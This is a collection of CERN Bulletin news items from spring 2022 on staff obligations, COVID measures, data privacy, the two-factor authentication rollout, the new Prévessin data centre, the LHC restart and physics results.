Family benefits – Obligation to provide information.
Members of the personnel are reminded that, pursuant to Articles R V 1.38 and R V 1.39 of the Staff Regulations, they are obliged to declare the following in writing to the Organization within 30 calendar days:
any change in family situation (marriage, civil partnership, birth or adoption of a child, divorce or dissolution of a partnership, death of a spouse or dependent child); any change in the situation of a dependent child (end of studies, start of paid employment, military service, marriage or civil partnership, change of residence or dependence status of a spouse’s child); the amount of any financial benefit of a similar nature to those stipulated in the Staff Regulations (e.g. family allowance, child allowance, infant allowance, non-resident allowance or international indemnity) to which the member of the personnel or a family member may be entitled from a source other than CERN.
The procedures to be followed are available in the Admin e-guide.
The Human Resources department also remains at your disposal to answer any questions:
Members of the personnel are also reminded that any false declaration or failure to make a declaration with a view to deceiving others or achieving a gain resulting in a financial loss or loss of reputation for the Organization constitutes fraud and may lead to disciplinary action in accordance with Article S VI 2.01 of the Staff Rules.
CERN Health Insurance Scheme (CHIS) - Obligation to provide information.
Staff members and fellows are reminded that, pursuant to Article IV 2.02 of the CHIS Rules, they are obliged to declare the following information concerning their spouse in writing to the Organization:
any other primary health insurance scheme of which the spouse is a member; and in the event that the spouse does not have adequate primary health insurance, the amount of any income received by the spouse deriving from a professional activity and/or a retirement pension.
This declaration must be made within the 30 calendar days following any change in the spouse’s:
professional activity (e.g. start or end of employment contract, change of employer); health insurance (we remind you that a change of country of residence may lead to a change in your spouse's health insurance); gross income, if this results in a change of income bracket (see the table here).
Declarations must be made using the “SHIPID” (Spouse Health Insurance & Professional Income Declaration) form.
The Human Resources department therefore advises staff members and fellows to check with their spouse that the details submitted in their latest declaration are still up-to-date and, if this is not the case, to make a new declaration using the “SHIPID” form without delay.
We remain at your disposal to answer any questions about the SHIPID form via the following e-mail address:
Members of the personnel are also reminded that any false declaration or failure to make a declaration with a view to deceiving others or achieving a gain resulting in a financial loss or loss of reputation for the Organization constitutes fraud and may lead to disciplinary action in accordance with the provisions of Article V 5.03 of the CHIS Rules and Article S VI 2.01 of the Staff Rules.

Blood donation, an essential act of solidarity, returns to CERN.
Giving blood saves lives.  Blood donation campaigns at CERN are resuming in 2022, with sessions on 30 May and 13 September
Blood donation on the CERN site is resuming, following a two-year hiatus due to COVID-19.
The first sessions will take place on 30 May and 13 September.
On 30 May, you will be able to give blood at Restaurant 2 from 8.30 a.m. to 3.30 p.m.
The session is being organised in collaboration with the HUG.
As the blood barometer shows, Geneva has a shortage of blood.  Your donation will therefore be immensely valuable.
Before coming to the donation point, make sure that you assess:
your health, notably checking that you have no symptoms such as fever, coughing, a cold or breathing difficulties; your eligibility to give blood, using this information sheet and questionnaire issued by the HUG (but please note that only the pre-donation conversation with the nurse or doctor on the day can confirm your eligibility).
We hope to see many of you there!
If you have any questions about blood donation in Switzerland, see this website.
Details of the session on 13 September, which will be organised in collaboration with EFS, will be made available in due course.
If you have any questions about blood donation in France, see this website.

This year, we are also offering a series of four preparatory training sessions, starting on 11 May.
Online booking for the Relay Race, the Nordic Walking event and the preparatory training sessions is open: you can sign up here or by scanning the QR code on the poster.
If you do not intend to run, we are also looking for volunteers to help with the organisation!
If you are interested, send us an e-mail at
We look forward to welcoming you to the starting line for this unique and exceptional event.
Further relaxing of COVID-19 measures at CERN.
Some of the COVID-19 restrictions on the CERN sites, such as the obligation to wear masks and proximeters at all times, had already been lifted with the move to level 1 (green) of the COVID scale on 14 March.
The improvement of the health situation in the region now allows further relaxing of the protection measures, as follows:
Meeting rooms are back to full capacity (as of 3 May) People with COVID-19-like symptoms should still self-declare on TRAMED and may come on site until test results are available: they are obliged to self-isolate only should their test be positive (as of 12 May)
However, contact case follow-up remains in place.
A flowchart to determine whether you are a close contact is available here.
If you are a close contact or have symptoms, you should continue to declare your situation via TRAMED and follow the instructions that will be given to you by the Medical Service.
Where required, testing will continue to be provided, by invitation only, at Building 57 (the infirmary).
Basic hygiene measures such as hand washing and disinfecting remain important and are strongly encouraged.
ADaMS Mobile v2.2 is out: download the app to facilitate your access to the CERN sites.
A new version of ADaMS Mobile, the CERN access management app, is currently being rolled out.
Version 2.2 introduces a major change for its users: the option to generate a temporary badge to enter the CERN sites when the physical access card has been left at home (the standard procedure involves having a paper slip printed out in Building 55)[1].
The temporary badge can be generated only once over the course of one day: it contains a QR code that security guards will be able to read and validate.
To create the badge, just log in to the app and choose “Generate temporary badge” in the menu.
You may keep a screenshot of the badge during the day, but please note that virtual badges should not be generated when a physical access card is lost.
In this case, a visit to Building 55 is always required to file a declaration of loss/theft, and to create a new access card.
[1] In the event that an access card has been left at home, accessing the site by showing a Swiss or French legitimation card remains possible.
Two upcoming public events on the environment at the Globe of Science and Innovation.
In May and June, the Globe will shine its spotlight on responsible consumption and the climate emergency
CERN’s Year of Environmental Awareness continues, with two evening events for the public scheduled at the Globe.
On Thursday, 12 May at 8 p.m., Dr Rachel Nisbet, researcher in ecocriticism at the University of Leeds, will lead an evening of discussion on (ir)responsible consumption with the goal of sparking a conversation about responsible consumption practices and answering the question: how can we come up with creative ways to preserve our social, financial and natural capital?
Following a reading of excerpts from Duncan Macmillan’s play Lungs (Séisme) by three students from the Serge Martin school of dramatic art in Geneva, Mathieu Fontaine, Head of Green Spaces and Biodiversity at CERN, will give a presentation on how the Laboratory is putting into practice its commitments to biodiversity and nature conservation on its 200 hectares of fenced land and 400 hectares of open land spanning the two Host States.
On Wednesday, 15 June at 8 p.m., climatologist Jean Jouzel has been invited by the Groupement des Français du CERN (GFC) to talk about the climate emergency. Following the release of the sixth assessment report of the Intergovernmental Panel on Climate Change (IPCC), of which he was vice-chair of the physical science working group from 2002 to 2015, he will be discussing the reality of global warming, its causes and consequences and the urgent measures that need to be taken.
Don't miss these two events, which will showcase CERN's environmental awareness-raising efforts and initiatives.

Passports and CVs should be handled with care.
How many times have you shared a copy of your passport, ID card or CV while working at CERN?
Whether you are a member of the personnel, a contractor or simply a visitor, it is very likely that you have shared some of these documents in order to comply with the various administrative processes in place at CERN – but did you know that the information contained in these documents is considered personal data and is therefore owned by the data subject?
CERN takes the processing of your personal data very seriously and applies the principles of its Data Privacy Protection Policy through Operational Circular no. 11, “The Processing of Personal Data at CERN”.  
As well as being a data subject, you may also process colleagues’ personal data.
In that case, what do you need to know if you are handling passports, ID documents or CVs at CERN?
Three key principles apply:
CVs, passports and ID documents should be shared only via secure platforms, such as CERNBox and Service Now, and never by email.
CVs, passports and ID documents that need to be stored should be appropriately protected and secure.
Once copies of CVs, passports and ID documents are no longer required, they should be deleted.
As a general rule, copies of passports and ID documents should not be stored for more than three months.
Hopefully, these simple tips are a helpful reminder of how to handle passports, ID documents and CVs with care.
Please spread the word among your colleagues.
Further information on data privacy at CERN can be found on the ODP website or obtained from your Departmental Data Privacy Coordinator.
CLIC technology for compact light sources.
X-ray free-electron lasers (XFELs), the latest generation of synchrotron-radiation sources, are as sought-after as they’re scarce.
The X-rays emitted by the electrons inside these linear accelerators are of precious help for research and medicine, but their high cost and complexity have meant that only a few such facilities are currently in operation worldwide.
CompactLight, an EU-funded project involving international laboratories and companies, is changing that story: the team has just released a conceptual design report presenting a new, compact and cost-effective X-ray facility that could democratise the use of these instruments in laboratories and hospitals across the world.
Among other things, the concept relies on high-gradient X-band radio-frequency structures developed in the framework of the Compact Linear Collider (CLIC) at CERN – yet more evidence of the relevance of research and development work on linear accelerators for society.

Success for the 2022 Django Girls Geneva virtual event.
On Saturday, 30 April 2022, 48 “Django Girls” took their first steps in computer programming, coached by CERN experts.
Django Girls is a non-profit organisation that provides free tools and resources to help volunteers to organise programming workshops all over the world.
The aim is to make this technology more accessible in order to encourage women and girls, who are underrepresented in the field, to join the world of computing.
This year, to mark the International Girls in ICT Day, CERN’s Women in Technology (WIT) community, its Visitors and Events Operations section and Microclub have joined forces to organise another fully virtual edition of Django Girls Geneva.
On the evening of Thursday, 28 April 2022 and during the all-day workshop on Saturday, 30 April 2022, 60 highly motivated participants got to grips with computer programming for the first time.
In a positive and welcoming environment, they learned how to create a blog and launch it online.
They were coached in small groups by 20 CERN experts, all of whom were eager to share their passion for information technologies.
The participants, of 21 different nationalities, responded with determination and close attention – essential qualities for learning via videoconference.
To echo Enrica Porcari, Head of CERN’s Information Technology department, in her welcome speech, we hope that this event will encourage these women and girls to confidently pursue studies and careers in the field of information technologies.
One-to-one meetings with the French tax authorities for CERN members of personnel.
In order to help Members of Personnel who may need assistance, the Organization has decided to set up individual tax consultation sessions with the French tax authorities (Service des Impôts des Particuliers (SIP) de Valserhône) to answer questions on income tax matters in France.
These consultations will take place on the Meyrin site, on 13 May 2022, from 9:30 to 11:30 and from 13:30 to 16:30.
They will be run by two four representatives of the SIP.
The sessions will require pre-booking an appointment via this portal.
There are a limited number of time slots available, so we recommend you sign up early.
Please note that these meetings will be in French.
Should you need any assistance with the language, we advise you to ask a French-speaking colleague for help.
Update 2 May 2022
Due the high level of interest in these individual sessions with the Service des impôts des particuliers (SIP), all available slots have now been booked.
Please note that slots may open up if appointments are cancelled, so we invite you to check the registration tool regularly.
Alternatively, you can consult the following resources:
The SIP offers telephone appointments, similarly to those organised by CERN.
You can request an appointment with the SIP by contacting them through this page.
You can find more information (opening hours, details) on this page in the admin e-guide.
The CERN admin e-guide offers several articles about tax issues.
See for example the Income tax declaration in France page and an FAQ available prepared by the Valserhône Service des impôts des particuliers.

Are you over sixty and living in France?
Don’t forget to book your second COVID-19 booster jab.
As of April, the second COVID-19 booster jab is available in France for people aged between 60 and 79.
For this age group, the vaccine must be administered at least six months after the previous booster.
For those aged 80 and above, who have already been eligible for several months, this requirement is reduced to three months.
The second booster jab, i.e. the fourth dose in most cases, is recommended by the French government, but is not mandatory for your health pass to remain valid.
The recommendation is based on studies – such as this one, which was conducted in Israel on subjects who had received the dose and was published in the New England Journal of Medicine – that have demonstrated the efficacy of the booster for the most vulnerable individuals.
Although the efficacy drops by half in the fourth week following vaccination, the study shows that the antibodies produced as a result of the injection offer real added protection for people over sixty years of age, as well as those with comorbidities or immunodeficiency.
The booster jab can be administered in vaccination centres, pharmacies and medical practices in Ain, Haute-Savoie and all over France, as well as at home.
However, it is not yet available in Switzerland, other than for immunocomprised individuals.
For residents of France, more information (in French) can be found on the French health insurance website and that of the government.
The Swiss Federal Council holds an extramural session at CERN.
The special session of Switzerland’s executive body was followed by an official visit by the President of the Confederation.
As an international organisation, CERN has been hosting diplomatic visits on a regular basis since its earliest days.
However, the visit of the Federal Council (the Swiss Confederation’s executive body, made up of seven elected representatives) on Wednesday, 27 April was rather exceptional.  The Council came to CERN for an extramural session, i.e. one that takes place beyond the walls of the Federal Palace in Bern, where it usually meets.
This special governmental meeting was followed by an official visit by the President of the Confederation, Ignazio Cassis.
Although unprecedented for CERN, this extramural version of the Federal Council’s weekly meeting is an established practice in Switzerland: since 2010, the Council has been demonstrating its commitment to the country’s regions by holding such external meetings at least once a year.
This year it’s the turn of the Canton of Geneva, and the President of the Confederation has declared innovation and diversity as the themes for the Council’s visit.
CERN is delighted to have been selected by the Federal Council as the place in Geneva that embodies these two concepts.
I am very pleased that the Federal Council is holding its 16th extramural session at CERN.
If Geneva is Switzerland’s window on the world, CERN is our window on the infinitely small and the infinitely fast.
Another way of exploring the universe and understanding how our world works.
Ignazio Cassis, President of the Swiss Confederation
During their visit, the federal councillors met Fabiola Gianotti and the members of her Directorate.
The Director-General presented the Laboratory and spoke with them, as well as with the members of the State Council of the Republic and Canton of Geneva and the mayor of Meyrin, who joined the federal delegation at CERN after the Council’s meeting.
The party then departed to continue the day’s programme with a meet-and-greet with the people of the canton.
Later in the day, the Director-General and the Directorate again welcomed Ignazio Cassis, President of the Confederation and head of the Federal Department of Foreign Affairs, accompanied by Viola Amherd, the federal councillor who heads the Federal Department of Defence, Civil Protection and Sport, and Viktor Rossi, Vice-Chancellor of the Confederation.
The President was received at the Globe of Science and Innovation, where he had the opportunity to view the progress of the CERN Science Gateway construction works, and then visited the ATLAS experiment cavern and the LHC tunnel.
Before leaving the site, the President signed the Visitors’ Book, bringing the eventful day to a close.
CERN’s innovation can protect our planet: ideas and projects are welcome!
Could CERN innovation be disseminated to tackle environmental challenges on a global scale?
The new CERN Innovation Programme on Environmental Applications (CIPEA) provides a framework to support this initiative.
Working at CERN, at the cutting edge of technology, we all know that the potential for innovation is huge.
The technologies we develop at CERN to achieve our scientific objectives can and do have multiple applications outside the Laboratory and often address challenges faced by society.
An Organization like CERN, committed to pursuing its mission of research, innovation, training and collaboration and serving as a prime example of international collaboration since its foundation in 1954, must also strive to be a role model when it comes to environmental responsibility.
There are two main ways to play an active and responsible role in this field.
The first one is direct and immediate: limiting the negative impact of the Organization’s activities on the environment and, in particular, minimising its own carbon footprint.
The initiatives launched as part of CERN’s year of environmental awareness clearly go in this direction.
The second one involves making a conscious effort to harness the unique skill set of the people and the technologies they develop within the Organization in order to maximise their positive impact on the environment globally.
The positive return for society will probably be long term, but the potential benefits are boundless.
The CERN Innovation Programme on Environmental Applications (CIPEA) was launched in March with the objective of stimulating and coordinating these efforts.
It aims to identify innovative ideas and technologies developed by CERN experts that could be used to help preserve our planet.
Several strategic domains with high potential impact and strong synergies with CERN's technical scope of expertise have been identified:
• renewable and low-carbon energy (production, transformation, distribution, storage)
• clean transportation and future mobility (aviation, shipping, rail and automotive)
• climate change and pollution control (monitoring, modelling, mitigation)
• sustainability and green science (power management, heat management, industrial processes).
Possible examples include superconducting technologies for high-efficiency power transmission, cryogenics and vacuum for advanced hydrogen storage, big data analysis tools for global-scale climate simulations and advanced algorithms for fast and low-power computing.
Could the technologies being developed by your team address major environmental challenges?
Could your lab facilities be used to build solutions for a healthier and more sustainable planet?
Please, let us know!
The deadline to submit proposals is 27 May.
The most promising ideas will be presented to the CERN community and management during the CERN Innovation Day on Environmental Applications in June.
These ideas will enjoy the support of the Knowledge Transfer group through internal instruments such as the KT Fund or the CERN Technology Impact Fund.
Establishing bilateral partnerships with industrial partners and external stakeholders (e.g. through EU support or national projects) could also help take your idea further.

Farewell to two CERN club giants.
Freddy Streun, co-founder of the CERN Ski club, and Norman Eatough, founder of the CERN Croquet club, are retiring from their club activities after decades of tireless service
The multinational nature of CERN is such that, since the Organization’s early days, members of our community have added their own national sports to the wide-ranging activities coordinated by the CERN clubs.
Freddy Streun, the Swiss co-founder of the Ski club, and Norman Eatough, hailing from the United Kingdom and founder of the Croquet club, perfectly embody this facet of the CERN “melting pot”.
After decades of event planning, organising, sweat and, above all, good fun with colleagues, they are both retiring from their respective clubs.
At 95, you can still find Freddy Streun on the slopes – he was an active instructor until he was 93 years old!
And while this long-time ski enthusiast is leaving the CERN Ski club, advancing years have nothing to do with it: he’s just leaving the region.
In 1963, he sat on the club’s founding committee and became its President in 1965.
Since then, he has helped to steer the club from various positions, including as Vice-President, as it grew in membership and scope over the decades, offering everything from outings to competitions and lessons.
Freddy was instrumental in organising these events each winter, and his expertise and vivacity will be sorely missed.
In 40 years as Croquet club President, Norman Eatough has left a distinctively British mark on CERN.
After founding the club in 1982 with a small band of fellow Britons, Norman oversaw its steady expansion and diversification.
Under his leadership, the club contributed to the formation of the Swiss Croquet Association, which led to similar clubs being created in Sion and Zurich.
Now, at 89, Norman has handed over the Presidency to David Underhill during a club meeting in which he was presented with a statuette depicting a croquet mallet and a plaque commemorating his 40 years in charge.
We wish Norman and Freddy long and happy retirements and hope to see them around at CERN!
FCC week 2022 from 30 May to 3 June – Register on Indico by 15 May.
The 2022 Future Circular Collider (FCC) week will take place from 30 May to 3 June in Paris, France.
The conference will be held in hybrid format, with the option to attend either in person or remotely.
The annual FCC collaboration meeting brings together the worldwide community working towards a world-leading high-energy physics facility for the twenty-first century.
Parallel sessions will cover accelerator, detector and physics studies, progress on technological R&D, placement studies for the new research facility, and an assessment of its environmental and socioeconomic impact.
The meeting will be an opportunity to share findings, build new collaborations and solidify the vision for a post-LHC circular particle collider.
We are looking forward to a week of intense and lively exchanges on future circular colliders, both within and beyond our community.
Register on the event’s Indico page by 15 May.
The SPS beam dump.
On 7 March, beams were circulated in the SPS for the first time this year.
In this article, we reflect on the successful commissioning of the accelerator’s new beam dump
As you may have read in a previous Bulletin article, the SPS has a new beam dump, located at Point 5 of the accelerator.
This new device, which is nine metres long and shielded with steel, concrete and marble, was built as part of the LHC Injectors Upgrade (LIU) project, in preparation for the High-Luminosity LHC (HL-LHC).
“It was commissioned in April 2021, during the post-LS2 restart of the SPS.
Everything went as planned,” says the engineer in charge of the project, Antonio Perillo Marcone of the SY-STI-TCD section.
“Thanks to the beam dump’s new instruments – in particular, the new beam instrumentation monitoring system, which records the profile of the beam when it enters the dump – we can track the absorption of the particles in real time.
In addition, new probes allow us to monitor the temperature inside the dump.”
As well as allowing real-time tracking, these new tools transmit data that is valuable for refining the digital models used to develop beam dumps in general, which are of increasing importance for CERN’s future projects.
But before smashing into the beam dump, the particles circulating in the SPS must be deflected from their path by kicker magnets.  “Six of these magnets have been installed in Long Straight Section 5 of the SPS, which leads to the beam dump.  Five of them were already part of the SPS and a sixth has been added in preparation for the increased beam intensity of the future HL-LHC and the new configuration of the SPS beam dump system,” says Étienne Carlier, project leader of the SPS beam dumping system upgrade project.
Unfortunately, while being commissioned in the accelerator, the new magnet revealed some unexpected limitations: “During tests in situ, the magnet was unable to withstand voltages above 35 kV, i.e. its maximum nominal operating voltage.
This surprised us, because these same tests had been carried out up to 38 kV without any problems during the validation phase carried out on the surface, before installation,” explains Étienne Carlier.
By opening up and inspecting the spare magnet, which is identical in every respect, the experts were able to put their finger on the problem: “Small ceramic supports, called spacers, were found to be preventing the magnets from withstanding higher voltages,” continues Étienne Carlier.
We therefore replaced these parts in the spare magnet, which we then installed in the SPS to replace the defective magnet during the year-end technical stop (YETS).”
The spare magnet, which has been functioning at its nominal voltage since the restart with beam, was reconditioned in the machine during the technical stop, to ensure that it could handle voltages of up to 38 kV.
It is currently being conditioned with beam as, being completely new, it releases a lot of particles – a normal process known as “outgassing”.
This phenomenon degrades the quality of the vacuum locally, although it does not impede the performance of the SPS.
Computer Security: Log in.  Click.  Be secure.
The ultimate silver bullet to protect your account, computer and data is using a sufficiently complex and unique password combined with a second-factor token, i.e. in addition to the password you know, something you have, like your smartphone or a hardware token.
This authentication process is known as two-factor authentication (“2FA”).  It presents a huge hurdle for any attacker, as they would need to not only acquire your password, which can be achieved virtually (“CERN has been phished again”), but also physically steal your hardware token.
As announced in the Bulletin of November 2021 (“Multifactor for the masses”), CERN is ready to roll out 2FA for part of the CERN community in the second quarter of 2022.
Log in.  Click.  Be secure.
In 2020, CERN focused on rolling out 2FA for experts needing to access and administer certain computing services, i.e. those with access to critical control systems (e.g. via the BE department’s ROGs), IT systems (e.g. using Foreman) or sensitive data.
However, this led to confusion among many users on when to use just their password and when to use multi-factor authentication.
Also, this did not take full advantage of two-factor authentication, as thorough, coherent and profound 2FA deployment is seen as the silver bullet for achieving account security (as already employed by your bank and, possibly, used by you outside CERN).
Hence, as of the second quarter of 2022, using two-factor authentication when logging into any CERN web application will become mandatory for those aforementioned experts given their critical powers and the critical nature of their accounts.
As of then, CERN’s new web-based Single Sign-On (SSO) portal will require them to authenticate with both their password and their second factor for any website behind CERN’s new web-based SSO*, regardless of whether it is to access a critical control system, administer a very important computing service or just browse the CERN phonebook or any other webpage behind the SSO.
Two hardware tokens are currently supported:
a dedicated one-time password generation app for smartphones – making that smartphone the second hardware token – or a physical USB token (e.g.  “Yubikey”) that uses a CERN-dedicated private/public keypair ( for the second authentication step.
Once authenticated correctly, work will continue as normal, as browser sessions will stay active for 12 hours or until the browser is closed, or another browser/device is used.
This would give those experts, their accounts, their data and applications and – ultimately – CERN the best protection against identity theft and password exposure.
People who are using CERN computing facilities “only” for their research duties and scientific endeavours are not affected by this new feature deployment but are still invited to opt in through the IT User Portal, and we hope that as many people as possible value their protection highly enough to take this additional step – a step that is common when accessing your bank account, for instance.
Roll out of this “2FA-WithNewSSO” (“2FA-WINS”) feature has started and will pursue in a staged approach commencing today for all volunteers interested in better securing and protecting their account and digital life. Just subscribe to this e-group to join.
For members of the CERN IT department, the usage of 2FA-logins on CERN’s new web-based SSO will become mandatory during Q2 2022, and, subsequently, followed by all experts holding critical access in the course of summer 2022.
Check out all the details (like how to activate 2FA or what to do if you lose it) on our dedicated webpage.  Log in.
Click.  Be secure.
*Non-web-based applications, like SSH bastion hosts, will continue to require 2FA only on a case-by-case basis.
Similarly, logins via the old SSO are not affected as this old service is supposed to be phased-out.

New and improved first-aid training scheme launched at CERN.
Take part in CERN’s new comprehensive first-aid scheme, with two dedicated programmes to learn how to save lives and prevent occupational hazards
Based on field experience and feedback from participants over the years, the HSE unit – represented by the Fire and Rescue Service, the Medical Service and the Safety Training Service – has designed a new and improved first-aid training scheme.
The new scheme comprises two complementary programmes: First Aid – Life-Saving Actions and First Aid – Workplace First-Aider (SST*).
The First Aid – Life-Saving Actions programme covers basic first-aid techniques in just three hours.
“The aim of this new, short and accessible programme, open to everyone working at CERN, is to teach as many people as possible what to do in the event of a medical emergency,” explains Julie Biringer, a CERN safety training expert.
“The programme covers the most commonly encountered and most critical emergencies, teaching participants how to use a defibrillator, perform CPR and treat injuries, wounds and haemorrhages, as well as how to tackle unconsciousness and airway obstruction.
Participants also learn how to raise the alarm and summon life support in the most efficient way.”
The First Aid – SST programme spans two days and its completion leads to the award of a certificate.
This particular programme is reserved for members of the personnel put forward by the departments and experiments according to their strategic emergency response requirements and the specific risks at play.
In addition to training people to perform first aid in the event of workplace accidents, this programme will also focus on prevention, i.e. reducing occupational risks.
The two programmes were rolled out in September 2021 and March 2022, respectively, and the number of available places will gradually increase in the coming months, with the goal of ultimately training several hundred people each year.

Building work for CERN’s new data centre in Prévessin begins.
On Friday, 22 April, a ceremony was held to mark the beginning of construction of CERN’s new energy-efficient data centre
On Friday, 22 April, a special ceremony was held to mark the beginning of construction of CERN’s new data centre.
The CERN Data Centre in Prévessin will come online during the final quarter of 2023.
This new, energy-efficient facility will play a vital role in meeting the computing needs generated by the ambitious upgrade programme for the Large Hadron Collider (LHC).
When the High-Luminosity LHC (HL-LHC) comes online in 2029, the total computing capacity required by the experiments is expected to be ten times greater than today.
Some of this shortfall will be filled by harnessing new, cutting-edge technologies and techniques: today, projects are examining how code can be modernised, how to capitalise fully on heterogeneous computing architectures, and how to benefit from the use of machine- and deep-learning approaches.
Nevertheless, a significant increase in computing resources will be required.
“Computing is central to CERN’s mission,” says Charlotte Warakaulle, CERN Director for International Relations, who participated in the first-stone ceremony for the new data centre.
“It turns data into knowledge, helping physicists unlock the secrets of the universe.”
The CERN Data Centre in Prévessin will provide computing resources up to a total electrical power requirement of 12 megawatts.  These resources will be delivered in three phases.
Each phase corresponds to one of the three floors of the new data centre, with the first phase set to run from 2023 to 2025.
It will see computing resources requiring up to 4 megawatts of electrical power installed; this is approximately the same as the power of the current CERN Data Centre in Meyrin for computing (excluding cooling).
The CERN Data Centre in Meyrin will continue to run in parallel, with a particular focus on data storage.
Together, the two data centres will form the heart of the Worldwide LHC Computing Grid (WLCG), the global computing network used to analyse and store data from the LHC experiments.
Today, the WLCG consists of 170 computer centres in 42 countries that formally pledge computing resources.
Together with tens of additional computer centres that contribute on other terms, they have been able to provide up to 1.4 million computer cores and 1.5 exabytes of storage.
Energy efficiency is at the core of the new data centre’s design; CERN's Procurement Service paid special attention to including sustainable solutions for the new building.
CERN aims for the new data centre to have a power usage effectiveness (PUE) of around 1.1.
To put this in context, the global average PUE for large data centres is around 1.5, with new data centres typically achieving a PUE between 1.2 and 1.4 (the closer to 1.0, the better the PUE score).
The PUE of the CERN Data Centre in Meyrin is about 1.5.
The CERN Data Centre in Prévessin will make use of the latest cooling technologies and will recuperate heat energy for warming other buildings on site.
During the data centre’s first phase of operation, the majority of the rejected heat will be recovered.
Projects for using this are now under consideration, with the target of bringing them online during this first phase.
“We’re proud that our new data centre will achieve the highest levels of energy efficiency,” says Enrica Porcari, Head of the CERN IT department.
“This helps us to keep costs down and fulfil our commitment to protecting the environment.”
Enrica Porcari and Charlotte Warakaulle were joined at the first-stone ceremony by Pippa Wells, CERN Deputy Director for Research and Computing, and Wayne Salter, leader of the project behind this new data centre.
They were also joined by representatives of the companies that will be responsible for building the new data centre and operating it for the first ten years.
Together, the group placed a time capsule into the building, containing a microprocessor, the signed contract for the new data centre and a photo of members of the IT department in 2022.
Large Hadron Collider restarts.
Beams of protons are again circulating around the collider’s 27-kilometre ring, marking the end of a multiple-year hiatus for upgrade work
The world’s largest and most powerful particle accelerator has restarted after a break of more than three years for maintenance, consolidation and upgrade work.
Today, 22 April, at 12:16 CEST, two beams of protons circulated in opposite directions around the Large Hadron Collider’s 27-kilometre ring at their injection energy of 450 billion electronvolts (450 GeV).
“These beams circulated at injection energy and contained a relatively small number of protons.
High-intensity, high-energy collisions are a couple of months away,” says the Head of CERN’s Beams department, Rhodri Jones.
“But first beams represent the successful restart of the accelerator after all the hard work of the long shutdown.”
“The machines and facilities underwent major upgrades during the second long shutdown of CERN’s accelerator complex,” says CERN’s Director for Accelerators and Technology, Mike Lamont.
“The LHC itself has undergone an extensive consolidation programme and will now operate at an even higher energy and, thanks to major improvements in the injector complex, it will deliver significantly more data to the upgraded LHC experiments.”
Pilot beams circulated in the LHC for a brief period in October 2021.
However, the beams that circulated today mark not only the end of the second long shutdown for the LHC but also the beginning of preparations for four years of physics-data taking, which is expected to start this summer.
Until then, LHC experts will work around the clock to progressively recommission the machine and safely ramp up the energy and intensity of the beams before delivering collisions to the experiments at a record energy of 13.6 trillion electronvolts (13.6 TeV).
This third run of the LHC, called Run 3, will see the machine’s experiments collecting data from collisions not only at a record energy but also in unparalleled numbers.
The ATLAS and CMS experiments can each expect to receive more collisions during this physics run than in the two previous physics runs combined, while LHCb, which underwent a complete revamp during the shutdown, can hope to see its collision count increase by a factor of three.
Meanwhile, ALICE, a specialised detector for studying heavy-ion collisions, can expect a fifty times increase in the total number of recorded ion collisions, thanks to the recent completion of a major upgrade.
The unprecedented number of collisions will allow international teams of physicists at CERN and across the world to study the Higgs boson in great detail and put the Standard Model of particle physics and its various extensions to the most stringent tests yet.
Other things to look forward to in Run 3 include the operation of two new experiments, FASER and to look for physics beyond the Standard Model; special proton–helium collisions to measure how often the antimatter counterparts of protons are produced in these collisions; and collisions involving oxygen ions that will improve physicists’ knowledge of cosmic-ray physics and the quark–gluon plasma, a state of matter that existed shortly after the Big Bang.

Environmental awareness: how CERN supports and encourages alternative forms of mobility.
A step-by-step approach to environmentally responsible commuting and duty travel
With a site spanning some 600 hectares across two Host States, commuting and intra- and inter-site mobility pose a real challenge for CERN.  With road traffic accounting for 19% of Europe’s total greenhouse gas (GHG) emissions, reducing the use of road transportation in commuting and duty travel represents a clear lever for CERN to impact its indirect GHG emissions.
In 2015, a survey by the Canton of Geneva focusing on international organisations in the region revealed that 17% of CERN commutes were made by soft mobility (cycling and walking), which is higher than the French average and on a par with the Swiss average.
This was confirmed by a mobility survey carried out at CERN in 2018.
Around 70% of CERN personnel live in France and most commute by car owing in part to the lack of public transport.
CERN’s goal for 2025 is to keep individual motorised vehicle commuting constant.
In close collaboration with the local authorities, CERN has implemented several initiatives to encourage soft mobility both to/from and at work.
These include the shuttle service and a fleet of bicycles available free of charge to members of the personnel.
In 2021, CERN launched a pilot scheme for free rental of e-bikes and e-scooters on its two main sites, and has also increased its cycling routes (a map showing all the cycling routes around CERN can be found here).
A topic that comes up with increasing frequency concerns electric cars.
As a move in this direction for CERN’s own vehicle fleet implies major investments in the infrastructure, the Organization is implementing a gradual approach by evaluating a reduction of the current professional car fleet and the possibility to use electric cars on site.
All mobility projects and new approaches are closely followed up and regularly reviewed by SCE in collaboration with other departments.
Since 2016, a working group on mobility has been continually investigating practices at CERN and proposing ways to optimise its mobility infrastructure.
Duty travel is also the subject of a dedicated working group, with a view to updating the CERN-wide guidelines on the matter and considering how to empower and encourage CERN personnel to make climate-conscious decisions when planning such travel.
In addition, the Organization takes part in wider exchanges on mobility with the Canton of Geneva and other international organisations in the region.
Finally, CERN relies on collaboration with its Host States to optimise commuting to and between the sites.
In this context, the Ain Department is currently evaluating a project with the aim of developing alternative modes of transport to individual cars and to simplify the routes for pedestrians and cyclists around the Porte de France near CERN’s Gate E.
As we return to regular on-site work in COVID-19 Level 1 – Green, now is a good time for us all to reflect on our mobility habits and how we can effectively contribute to reducing GHG emissions in our own way.
Car sharing, taking the bus or cycling, even just once a week, can make a significant difference.
Biking to work is not only good for the environment: it has tangible health benefits too.
And let us all remember to respect each other whatever our mode of transport, acting in a safe manner towards all road users, whether it be on foot, two wheels or four.
This article is part of the series “CERN’s Year of Environmental Awareness”.
Obligation to register vehicles driven on the CERN site.
With on-site work having resumed, and the holiday season approaching, we would like to remind you of a few key rules.
In accordance with Operational Circular No. 2, all drivers must facilitate the identification of their vehicle when on the CERN site.
You must therefore register all vehicles registered to you, including motorbikes:
either online, using the vehicle registration application, or in person by going to the Registration Service (55/1-001), open from Monday to Friday between 7.00 a.m. and 5.00 p.m., with a copy of your vehicle’s registration document (carte grise).
We also remind you that parking on site is limited to five consecutive days and that the vehicle must have a number plate and be insured.
For periods longer than five days, long-term parking is available for vehicles and bicycles on request.
CMS measures the mass of the top quark with unparalleled accuracy.
Precise knowledge of the top-quark mass is of paramount importance to understand our world at the smallest scale
The CMS collaboration at the Large Hadron Collider (LHC) has performed the most accurate ever measurement of the mass of the top quark – the heaviest known elementary particle.
The latest CMS result estimates the value of the top-quark mass with an accuracy of about 0.22%.
The substantial gain in accuracy comes from new analysis methods and improved procedures to consistently and simultaneously treat different uncertainties in the measurement.
The precise knowledge of the top-quark mass is of paramount importance to understand our world at the smallest scale.
Knowing this heaviest elementary particle as intimately as possible is crucial because it allows testing of the internal consistency of the mathematical description of all elementary particles, called the Standard Model.
